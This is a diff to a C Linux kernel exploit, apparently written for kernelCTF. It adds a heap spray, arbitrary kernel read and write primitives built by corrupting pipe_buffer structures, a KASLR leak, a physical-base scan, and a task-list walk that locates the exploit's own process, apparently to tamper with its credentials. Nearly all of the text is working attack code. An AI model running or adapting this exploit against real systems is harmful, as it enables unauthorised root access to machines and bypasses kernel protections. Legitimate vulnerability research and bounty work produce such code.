@@ -642,15 +642,17 @@ char global_buffer[0x4000] = { 0 };
 int pipes[MAX_PIPE_NUM][2] = { 0 };
 int pipe_pages[PIPE_PAGE_NUM][2] = { 0 };
 
+#define SPRAY_SIZE 192
+
 void *do_iov_spray(void *idx) {
   pin_to_cpu(0);
 
   unsigned long pipe_idx = (unsigned long)(idx);
   char data[0x100] = {};
-  struct iovec iovec_array[256 / 16];
-  assert(sizeof(iovec_array) == 256);
+  struct iovec iovec_array[SPRAY_SIZE / 16];
+  assert(sizeof(iovec_array) == SPRAY_SIZE);
 
-  for (int i = 0; i < 256 / 16; i++) {
+  for (int i = 0; i < SPRAY_SIZE / 16; i++) {
     iovec_array[i].iov_len = 1;
     iovec_array[i].iov_base =
         (void *)((char *)global_buffer + pipe_idx * 16 + i);
@@ -666,12 +668,12 @@ void *do_iov_spray(void *idx) {
   // printf("pipe %ld spaied\n", pipe_idx);
   // if (pipe_idx == 0) printf("allocating 256 for 0\n");
   // printf("pipe idx %ld allocated\n", pipe_idx);
-  int res = readv(pipes[pipe_idx][0], iovec_array, 256 / 16);
-  if (res != 256 / 16) {
+  int res = readv(pipes[pipe_idx][0], iovec_array, SPRAY_SIZE / 16);
+  if (res != SPRAY_SIZE / 16) {
     printf("pipe %ld res is %d\n", pipe_idx, res);
     // iov might be corrupted, do that again without iov
     res = read(pipes[pipe_idx][0], (char *)global_buffer + pipe_idx * 16,
-               256 / 16);
+               SPRAY_SIZE / 16);
     printf("second read, res is %d\n", res);
   }
   write(sync_pipes[1], "E", 1);
@@ -693,6 +695,136 @@ spray_256:
   }
 }
 
+
+struct pipe_buffer_t {
+  unsigned long page;
+  unsigned int offset, len;
+  unsigned long ops;
+  unsigned long flag;
+  unsigned long private;
+};
+
+int exp_pipes[5] = { 0 };
+struct pipe_buffer_t saved_pipe_buffer_leak = { 0 };
+usize vmem_base = 0;
+usize kaslr_base = 0;
+usize phys_base = 0;
+
+#ifdef ARM
+
+// arm implementation
+unsigned long page_address(unsigned long page) {
+  unsigned long addr = ((page << 6) + 0xffffc008000000ul) | 0xffff000000000000;
+  // printf("page %lx to addr %lx\n", page, addr);
+  return addr;
+}
+
+unsigned long addr_to_page(unsigned long addr) {
+  addr = addr & 0xfffffffffffff000ul;
+  unsigned long page = ((addr - 0xffffc008000000ul) >> 6);
+  // printf("addr %lx to page %lx\n", addr, page);
+  return page;
+}
+
+#else
+
+usize addr_to_page(usize addr) {
+  return ((addr >> 12) << 6) + vmem_base;
+}
+
+usize is_linear_address(usize addr) {
+  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
+}
+
+#endif
+
+unsigned long read64(unsigned long addr) {
+  if ((addr & 0xfff) + 8 > 0x1000) {
+    panic("invalid read");
+    return 0;
+  }
+
+  int pipe_buffer_offset = exp_pipes[4];
+
+  // put the page to tmp_page;
+  read(exp_pipes[2], global_buffer, 0x1000);
+
+  memset(global_buffer, 'D', 0x1000);
+  unsigned long *buf = (unsigned long *)global_buffer;
+  struct pipe_buffer_t *p_buffer =
+      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);
+
+  memcpy(p_buffer, &saved_pipe_buffer_leak, 40);
+
+  p_buffer->page = addr_to_page(addr);
+  p_buffer->len = 9;
+  p_buffer->offset = addr & 0xfff;
+  for (int i = 1; i < 4; i++) {
+    memcpy(p_buffer + i, p_buffer, 40);
+  }
+
+  // overwrite pipe_buffer
+  write(exp_pipes[3], global_buffer, 0x1000);
+
+  // now do the read memory
+  unsigned long data;
+  read(exp_pipes[0], &data, 8);
+  return data;
+}
+
+void write64(unsigned long addr, unsigned long data) {
+  assert((addr & 0xfff) + 8 <= 0x1000);
+
+  int pipe_buffer_offset = exp_pipes[4];
+
+  // put the page to tmp_page;
+  read(exp_pipes[2], global_buffer, 0x1000);
+
+  memset(global_buffer, 'D', 0x1000);
+  unsigned long *buf = (unsigned long *)global_buffer;
+  struct pipe_buffer_t *p_buffer =
+      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);
+
+  memcpy(p_buffer, &saved_pipe_buffer_leak, 40);
+
+  p_buffer->page = addr_to_page(addr);
+  p_buffer->len = 0;
+  p_buffer->offset = addr & 0xfff;
+  for (int i = 1; i < 4; i++) {
+    memcpy(p_buffer + i, p_buffer, 40);
+  }
+
+  // overwrite pipe_buffer
+  write(exp_pipes[3], global_buffer, 0x1000);
+
+  // now do the write of memory
+  write(exp_pipes[1], &data, 8);
+}
+
+usize read64_virtual(usize addr) {
+  return read64(addr - kaslr_base + phys_base);
+}
+
+void write64_virtual(usize addr, usize data) {
+  write64(addr - kaslr_base + phys_base, data);
+}
+
+void read_mem(unsigned long addr, unsigned long *data, unsigned size) {
+  for (int i=0; i<size/8; i++) {
+    data[i] = read64(addr+i*8);
+  }
+}
+
+void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
+  for (int i=0; i<size/8; i++) {
+    write64(addr+i*8, data[i]);
+  }
+}
+
+#define KERNEL_BASE 0xffffffff81000000
+#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
+
 void exploit() {
   int start_step_pipes[2] = { 0 };
   int end_step_pipes[2] = { 0 };
@@ -707,8 +839,6 @@ void exploit() {
 
   pin_to_cpu(0);
 
-  int exp_pipes[4] = { 0 };
-
   // puts("trigger");
   // setup_bug();
   // trigger_bug();
@@ -717,7 +847,6 @@ void exploit() {
   // char global_buffer[0x100] = { 0 };
 
   for (int i = 0; i < MAX_PIPE_NUM; i++) {
-    printf("%d\n", i);
     SYSCHK(pipe(pipes[i]));
     // prefault the page
     CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
@@ -828,6 +957,131 @@ void exploit() {
     sleep(3);
     return;
   }
+
+  // rewrite pipe buffer
+  write(exp_pipes[1], "KCTF", 0x4);
+
+  // now check the pipe pages
+  unsigned long *recv_buffer =
+      (unsigned long *)((char *)global_buffer + 0x1000);
+  unsigned long *pipe_buffer = 0;
+  int res = 0, exp_pipe_idx = -1;
+  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
+    res = read(pipe_pages[i][0], recv_buffer, 0x1000);
+    if (res != 0x1000) {
+      panic("pipe read error");
+    }
+
+    for (int j = 0; j < (0x1000 / 8); j++) {
+      if (recv_buffer[j] != 0x4141414141414141) {
+        pipe_buffer = recv_buffer + j;
+        memcpy(&saved_pipe_buffer_leak, pipe_buffer, 40);
+        exp_pipe_idx = i;
+        exp_pipes[2] = pipe_pages[i][0];
+        exp_pipes[3] = pipe_pages[i][1];
+        exp_pipes[4] = j - 5; // pipe_buffer should move forward
+        break;
+      }
+    }
+    if (pipe_buffer != 0)
+      break;
+  }
+
+  if (exp_pipe_idx == -1) {
+    printf("failed, please retry\n");
+    getchar();
+  }
+
+  // setup for read64 and write64
+  write(exp_pipes[3], recv_buffer, 0x1000);
+
+  FILE *file = fopen("/proc/self/comm", "w");
+  if (file == NULL) {
+    panic("could not set /proc/self/comm");
+  }
+  fwrite("expp", sizeof(char), 4, file);
+  fclose(file);
+
+  char command[128] = { 0 };
+  sprintf(command, "cat /proc/%d/comm", getpid());
+
+  system("echo hiiiiiii");
+  system("cat /proc/self/comm");
+  system(command);
+
+  printf("leaked pipe page at %lx\n", saved_pipe_buffer_leak.page);
+  printf("leaked ops at %lx\n", saved_pipe_buffer_leak.ops);
+
+  kaslr_base = saved_pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
+  printf("leaked kaslr base: %lx\n", kaslr_base);
+
+  vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000 ;
+  printf("vmemmap base: %lx\n", vmem_base);
+
+  usize start_bytes = 0x4802603f51258d48;
+  phys_base = 0;
+  for (;;) {
+    if (read64(phys_base) == start_bytes) {
+      printf("physical base address: %lx\n", phys_base);
+      break;
+    }
+
+    phys_base += 0x1000;
+  }
+
+  usize current_task = INIT_OFFSET + kaslr_base;
+
+  usize comm_offset = 0;
+  usize cred_offset = comm_offset - 0x10;
+  usize next_task_offset = 0;
+
+  for (usize i = 0; i < 4096 - 8; i+=8) {
+    usize value = read64_virtual(current_task + i);
+    usize value2 = read64_virtual(current_task + i + 8);
+    // check for 'swapper/' string
+    if (value == 0x2f72657070617773) {
+      comm_offset = i;
+      printf("comm offset: %lx\n", comm_offset);
+    }
+
+    if (is_linear_address(value) && is_linear_address(value2)) {
+      printf("%lx, %lx\n", value, value2);
+      usize prev_ptr = read64_virtual(value + 8);
+      if (prev_ptr == current_task + i && value % 128 == i % 128) {
+        next_task_offset = i;
+        printf("next task offset: %lx\n", next_task_offset);
+      }
+    }
+  }
+
+  for (next_task_offset = 0; next_task_offset < 4096; next_task_offset += 8) {
+    printf("offset: %lx\n", next_task_offset);
+    current_task = INIT_OFFSET + kaslr_base;
+    usize counter = 0;
+    for (;;) {
+      usize new_task = read64_virtual(current_task + next_task_offset) - next_task_offset;
+      printf("new task: %lx\n", new_task);
+      if (new_task == current_task || !is_linear_address(new_task) || counter > 8 || new_task > 0xfffffffffff00000 || new_task % 8 != 0) {
+        //printf("failed to find new task\n");
+        break;
+        // getchar();
+        // panic("done");
+      }
+      current_task = new_task;
+      counter += 1;
+
+      unsigned long name[2] = { 0 };
+      name[0] = read64_virtual(current_task + comm_offset);
+      printf("%s\n", name);
+
+      if (!strcmp((char *)name, "expp")) {
+        printf("we found the process at %lx\n", current_task);
+        break;
+      }
+    }
+  }
+
+  getchar();
 }
 
 int main() {
